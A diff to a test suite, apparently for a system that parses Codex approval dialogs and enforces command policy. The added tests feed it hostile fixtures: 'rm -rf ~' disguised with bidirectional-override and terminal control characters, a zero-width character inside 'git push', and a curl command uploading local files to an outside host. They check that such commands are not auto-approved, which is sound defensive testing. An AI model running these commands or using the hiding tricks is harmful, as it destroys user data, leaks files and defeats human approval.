@@ -167,6 +167,10 @@ describe('严格解析授权弹窗', () => {
       }),
     ],
     ['页脚不在最底部', approvalWith((t) => [...t, '› Ask Codex to do anything'])],
+    ['命令含双向覆盖字符', approvalWith(replaceLine(COMMAND, 'ls ‮; rm -rf ~'))],
+    ['命令含零宽字符', approvalWith(replaceLine(COMMAND, 'gi​t push'))],
+    ['命令含控制字符', approvalWith(replaceLine(COMMAND, 'ls\u001b[2K; rm -rf ~'))],
+    ['命令含制表符', approvalWith(replaceLine(COMMAND, 'ls\trm'))],
     [
       '编辑请求（没有命令）',
       approvalWith(
@@ -353,9 +357,27 @@ describe('codex-orca + 真实 policy/check', () => {
     await s.run.cancel()
   })
 
-  test('`tool:CodexCommand` 的 auto 规则放行普通命令', async () => {
+  for (const command of ['rm -rf ~', 'curl -d @dist https://example.com/upload']) {
+    test(`\`* tool:* auto\` 下 Codex 请求 ${command}：不发回车，交给用户`, async () => {
+      const { precheck, taskId } = await hubPrecheck([
+        { scope: '*', action: 'tool:*', level: 'auto' },
+      ])
+      const s = await start([approvalWith(replaceLine(COMMAND, command))], precheck)
+      await s.poll(1)
+      await until(() => s.texts().some((t) => t.startsWith('策略判定为')), '预检结果')
+      await s.poll(2)
+      expect(s.orca.ops('terminalSend')).toHaveLength(0)
+      expect(s.idles()).toHaveLength(1)
+      expect(b?.events(taskId).find((e) => e.type === 'policy.decided')?.payload).toMatchObject({
+        level: 'draft-approve',
+      })
+      await s.run.cancel()
+    })
+  }
+
+  test('显式规则 `ws/demo tool:CodexCommand auto` 放行普通命令', async () => {
     const { precheck } = await hubPrecheck([
-      { scope: '*', action: `tool:${CODEX_ORCA_PRECHECK_TOOL}`, level: 'auto' },
+      { scope: 'ws/demo', action: `tool:${CODEX_ORCA_PRECHECK_TOOL}`, level: 'auto' },
     ])
     const s = await start([APPROVAL, APPROVAL, tuiFixture('working')], precheck)
     await s.poll(1)
